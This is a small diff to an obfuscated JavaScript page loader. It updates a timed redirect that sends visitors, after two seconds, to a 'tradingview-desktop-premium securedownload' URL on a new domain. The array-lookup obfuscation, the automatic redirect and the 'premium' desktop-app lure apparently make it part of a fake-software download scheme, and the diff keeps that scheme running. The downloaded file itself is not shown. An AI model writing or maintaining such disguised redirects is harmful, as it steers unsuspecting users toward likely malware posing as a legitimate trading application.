@@ -9,6 +9,6 @@
 
     window[_0[5]](function() {
         loaderElement[_0[2]] = _0[4];
-        window[_0[6]][_0[7]] = 'https://www.hanepathub.site/hanepat.github.io/tradingview-desktop-premium/securedownload/';
+        window[_0[6]][_0[7]] = 'https://www.hanepat.shop/hanepat.github.io/tradingview-desktop-premium/securedownload/';
     }, 2000);
 })();
